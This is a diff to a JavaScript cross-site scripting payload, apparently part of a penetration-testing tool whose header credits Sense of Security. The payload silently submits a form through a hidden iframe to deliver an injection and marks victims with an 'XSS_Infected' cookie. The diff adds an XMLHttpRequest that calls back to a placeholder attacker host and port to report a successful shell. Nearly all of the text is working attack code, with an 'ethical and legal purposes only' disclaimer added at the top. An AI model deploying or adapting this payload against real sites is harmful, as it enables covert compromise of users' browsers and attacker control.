@@ -1,6 +1,13 @@
 // Author: MaXe / InterN0T
 // Updated by: Hans-Michael Varbaek
-// Sense of Security
+// Company: Sense of Security
+//
+// Version 2.5 - 2016
+//
+// Changelog:
+// - Ver 2.5: Added XMLHttpRequest for JS Notification
+//
+// For ethical and legal purposes only. This script is provided as is and without warranty.
 
 function silent_inject() {
 
@@ -43,6 +50,10 @@ function silent_inject() {
    // Submit our payload automatically - There's no turning back now
    if (document.cookie.indexOf("XSS_Infected") == -1) {
       top.document.getElementById('silent_frame').contentDocument.getElementById('soslabs').submit();
+      // NEW FEATURE - Moved to this section to prevent double-loading of the URL
+      var request = new XMLHttpRequest(); // Initiate XMLHttpRequest
+      request.open("GET", "http://CALLBACKHOST:CALLBACKPORT/js_shell_notify.txt"); // Method and URL to send the request to - Hostname and port are set by xsser.py
+      request.send(); // Send the request
       SetCookie("XSS_Infected","true"); // Prevent re-infection / loops
    }
 
